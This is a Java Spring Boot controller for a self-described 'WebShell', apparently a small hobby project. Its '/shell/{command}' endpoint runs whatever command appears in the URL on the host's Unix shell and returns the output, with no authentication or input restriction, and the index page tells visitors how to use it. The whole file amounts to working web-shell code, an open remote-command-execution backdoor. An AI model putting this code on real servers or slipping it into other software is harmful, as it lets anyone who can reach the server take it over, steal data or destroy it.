package io.secondconstantine.shell.controller;

import io.secondconstantine.shell.util.UnixShell;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class ShellController {

    @GetMapping("/")
    public String index() {
        return "<h1>WebShell by <a href=https://github.com/second-constantine>second-constantine</a>" +
                "<br> Powered by 'spring-boot 2v' " +
                "<br>How use: write command in url before 'shell/'" +
                "<br>Swagger: <a href=swagger-ui.html>this</a></h1>";
    }

    @RequestMapping("/shell/{command}")
    public String command(@PathVariable String command) {
        return "<pre>" + UnixShell.executeCommand(command) + "</pre>";
    }
}
